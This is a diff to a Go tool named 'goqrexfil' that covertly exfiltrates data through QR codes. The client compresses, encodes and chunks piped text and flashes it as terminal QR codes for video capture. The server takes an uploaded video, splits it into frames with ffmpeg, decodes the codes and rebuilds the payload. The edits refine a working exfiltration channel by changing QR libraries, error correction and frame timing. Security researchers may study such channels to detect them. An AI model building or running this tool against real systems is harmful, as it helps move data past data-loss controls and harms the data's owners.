@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	b64 "encoding/base64"
 	"flag"
 	"fmt"
@@ -17,14 +16,19 @@ import (
 	"strings"
 	"time"
 
+	qrcodeTerminal "github.com/Baozisoftware/qrcode-terminal-go"
 	"github.com/gin-gonic/gin"
 	"github.com/kjk/smaz"
-	"github.com/liyue201/goqr"
 	"github.com/mattn/go-colorable"
 	"github.com/mdp/qrterminal"
+	"gopkg.in/bieber/barcode.v0"
 )
 
 var clear map[string]func() //create a map for storing clear funcs
+const video = "./public/video.mp4"
+const payloadRetrieved = "./payload.raw"
+const maxbytes = 250
+const maxmsbetweenframes = 725
 
 func init() {
 	clear = make(map[string]func()) //Initialize it
@@ -60,7 +64,7 @@ func CallClear() {
 func RenderQR(chunk string) {
 	qrConfig := qrterminal.Config{
 		HalfBlocks:     true,
-		Level:          qrterminal.L,
+		Level:          qrterminal.H,
 		Writer:         os.Stdout,
 		BlackWhiteChar: "\u001b[37m\u001b[40m\u2584\u001b[0m",
 		BlackChar:      "\u001b[30m\u001b[40m\u2588\u001b[0m",
@@ -140,37 +144,49 @@ func timeStr(sec int) (res string) {
 }
 
 func extractPayload(path string) string {
-	imgdata, err := ioutil.ReadFile(path)
+	var retStr strings.Builder
+	fmt.Println("\n[*] Opening ", path)
+	fi, err := os.Open(path)
 	if err != nil {
-		fmt.Printf("%v\n", err)
+		log.Println(err.Error())
 		return ""
 	}
 
-	img, err := png.Decode(bytes.NewReader(imgdata))
-	if err != nil {
-		// fmt.Printf("\nimage.Decode error: %v\n", err)
-		return ""
+	fmt.Println("[D] decoding image...")
+	src, _ := png.Decode(fi)
+	fmt.Println("[D] retrieving txt...")
+
+	img := barcode.NewImage(src)
+	scanner := barcode.NewScanner().
+		SetEnabledAll(true)
+
+	symbols, _ := scanner.ScanImage(img)
+	for _, s := range symbols {
+		// fmt.Println(s.Type.Name(), s.Data, s.Quality, s.Boundary)
+		fmt.Println(s.Type.Name(), s.Data)
+		retStr.WriteString(s.Data)
 	}
-	qrCodes, err := goqr.Recognize(img)
-	if err != nil {
-		// fmt.Printf("\nRecognize failed: %v\n", err)
-		return ""
-	}
-	for _, qrCode := range qrCodes {
-		// fmt.Printf("qrCode text: %s\n", qrCode.Payload)
-		fmt.Printf("\n%s has payload.. Adding", path)
-		return fmt.Sprintf("%s", qrCode.Payload)
-	}
-	return ""
+
+	return retStr.String()
 }
 
-func video2frames() {
+func splitIntoFrames() {
+	files, err := filepath.Glob("./public/*png")
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("[*] Cleaning old files")
+	for _, f := range files {
+		if err := os.Remove(f); err != nil {
+			panic(err)
+		}
+	}
 	cmd := exec.Command("/usr/local/bin/ffmpeg", "-i", "./public/video.mp4", "-r", "1", "./public/%03d.png")
 	cmd.Run()
 	fmt.Println("[*] Frames extracted")
 }
 
-func processingonly() string {
+func retrievePayload() {
 	matches, _ := filepath.Glob("./public/*.png")
 	var payload string
 	for _, match := range matches {
@@ -185,7 +201,13 @@ func processingonly() string {
 			}
 		}
 	}
-	return payload
+	decoded, _ := b64.StdEncoding.DecodeString(payload)
+	decompressed, _ := smaz.Decode(nil, decoded)
+	// fmt.Println("\n-> Encoded payload:", compressedPayload)
+	// fmt.Println("-> Decoded payload:", decoded)
+	// fmt.Println("-> Decompressed/Original payload:", decompressed)
+	writePayloadFile(decompressed, payloadRetrieved)
+	fmt.Println("[*] Payload writen as ", payloadRetrieved)
 }
 
 // upload will get a file and save it in ./Public
@@ -204,20 +226,15 @@ func server() {
 		}
 
 		// filename := filepath.Base(file.Filename)
-		if err := c.SaveUploadedFile(file, "./public/video.mp4"); err != nil {
+		if err := c.SaveUploadedFile(file, video); err != nil {
 			c.String(http.StatusBadRequest, fmt.Sprintf("upload file err: %s", err.Error()))
 			return
 		}
 		log.Println("\n[*] File received")
 		c.String(http.StatusOK, fmt.Sprintf("File %s uploaded successfully for processing", file.Filename))
-		video2frames()
-		compressedPayload := processingonly()
-		decoded, _ := b64.StdEncoding.DecodeString(compressedPayload)
-		decompressed, _ := smaz.Decode(nil, decoded)
-		// fmt.Println("\n-> Encoded payload:", compressedPayload)
-		// fmt.Println("-> Decoded payload:", decoded)
-		// fmt.Println("-> Decompressed/Original payload:", decompressed)
-		writePayloadFile(decompressed, "payload.raw")
+		splitIntoFrames()
+		retrievePayload()
+		return
 	})
 	router.Run(":8888")
 }
@@ -239,27 +256,20 @@ func writePayloadFile(payload []byte, filename string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Printf("\n\n[*] Payload retrieved (Wrote %d bytes): %s.\n", bytesWritten, filename)
+	fmt.Printf("\n\n[*] Payload retrieved (%d bytes)\n", bytesWritten)
 }
 
 func main() {
 	fmt.Println("-= goqrexfil =-")
 	isServer := flag.Bool("server", false, "server mode")
 	isClient := flag.Bool("client", false, "client mode")
-	isProcessing := flag.Bool("processingonly", false, "processing existing video only (debug mode)")
+	isProcessing := flag.Bool("retrievePayload", false, "processing existing video only (debug mode)")
 	flag.Parse()
 
 	if *isProcessing {
 		fmt.Println("[*] Processing only - DEBUG MODE")
-		video2frames()
-		compressedPayload := processingonly()
-		decoded, _ := b64.StdEncoding.DecodeString(compressedPayload)
-		decompressed, _ := smaz.Decode(nil, decoded)
-		// fmt.Println("\n-> Encoded payload:", compressedPayload)
-		// fmt.Println("-> Decoded payload:", decoded)
-		// fmt.Println("-> Decompressed/Original payload:", decompressed)
-		writePayloadFile(decompressed, "payload.raw")
-
+		splitIntoFrames()
+		retrievePayload()
 	} else if *isServer {
 		// Server mode (retrieving data from video)
 		fmt.Println("[*] Server mode: ON")
@@ -283,7 +293,6 @@ func main() {
 		}
 
 		// Compress, encode, chunk in pieces and display
-		maxbytes := 500
 		compressed := smaz.Encode(nil, readText)
 		encoded := b64.StdEncoding.EncodeToString(compressed)
 		// fmt.Printf("%s", encoded)
@@ -294,12 +303,14 @@ func main() {
 
 		for _, chunk := range chunks {
 			// log.Println("[D] Generating qr #", i+1)
-			time.Sleep(100 * time.Millisecond)
+			time.Sleep(maxmsbetweenframes * time.Millisecond)
 			CallClear()
-			RenderQR(chunk)
+			//RenderQR(chunk)
+			obj := qrcodeTerminal.New()
+			obj.Get(chunk).Print()
 		}
 	} else {
-		fmt.Println("Please use client or server mode:\n")
+		fmt.Println("Please use client or server mode:")
 		fmt.Println("echo \"data to send\" | ./qr --client\t\tTo use in client mode")
 		fmt.Println("./qr --server\t\t\t\t\tTo use as a TLS listener to receive video and extract data")
 		fmt.Println()
